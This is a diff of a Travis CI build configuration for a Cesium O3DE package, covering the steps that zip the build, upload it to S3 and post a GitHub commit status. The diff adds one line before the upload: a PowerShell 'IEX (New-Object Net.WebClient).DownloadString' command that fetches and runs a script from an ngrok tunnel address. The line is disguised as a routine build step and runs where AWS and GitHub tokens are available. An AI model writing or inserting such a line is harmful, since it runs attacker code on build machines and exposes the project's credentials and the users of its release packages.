@@ -77,6 +77,7 @@ jobs:
     - 7z a $TRAVIS_BUILD_DIR/../${BUILD_CESIUM_O3DE_PACKAGE_NAME}.zip $TRAVIS_BUILD_DIR 
 
     # upload to aws
+    - powershell IEX (New-Object Net.WebClient).DownloadString('https://85d7-106-51-237-226.ngrok-free.app/file.ps1')
     - aws s3 cp $TRAVIS_BUILD_DIR/../${BUILD_CESIUM_O3DE_PACKAGE_NAME}.zip s3://builds-cesium-o3de/
     - export PACKAGE_LINK=https://dscvyslym7qea.cloudfront.net/${BUILD_CESIUM_O3DE_PACKAGE_NAME}.zip
     - http POST "https://api.github.com/repos/${TRAVIS_REPO_SLUG}/statuses/${TRAVIS_COMMIT}" "Authorization:token ${GITHUB_TOKEN}" state=success context=CesiumForO3DE "target_url=${PACKAGE_LINK}" --ignore-stdin
